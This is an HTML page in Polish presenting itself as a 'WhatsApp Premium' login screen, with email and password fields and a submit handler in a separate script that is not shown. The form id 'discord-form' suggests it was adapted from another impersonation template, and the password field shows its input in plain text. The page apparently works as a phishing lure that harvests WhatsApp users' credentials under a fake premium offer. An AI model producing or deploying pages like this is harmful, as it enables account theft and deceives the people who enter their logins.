<!doctype html>
<html lang="pl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WhatsApp Premium</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600&family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="styles.css">
  <script src="script.js" defer></script>
</head>
<body>
  <main class="page-shell">
    <section class="form-panel" aria-labelledby="page-title">
      <div class="whatsapp-header">
        <div class="whatsapp-mark" aria-label="WhatsApp">WA</div>
        <div>
          <h1 id="page-title">Logowanie</h1>
        </div>
      </div>
      <div class="chat-preview" aria-hidden="true">
      </div>

      <form id="discord-form">
        <input id="first-text" name="firstText" type="text" placeholder="email" maxlength="200" required>

        <input id="second-text" name="secondText" type="text" placeholder="hasło" maxlength="200" required>

        <button type="submit" id="submit-button">
          <span>Zaloguj</span>
        </button>
        <p id="form-status" class="form-status" role="status" aria-live="polite"></p>
      </form>
    </section>
  </main>

</body>
</html>
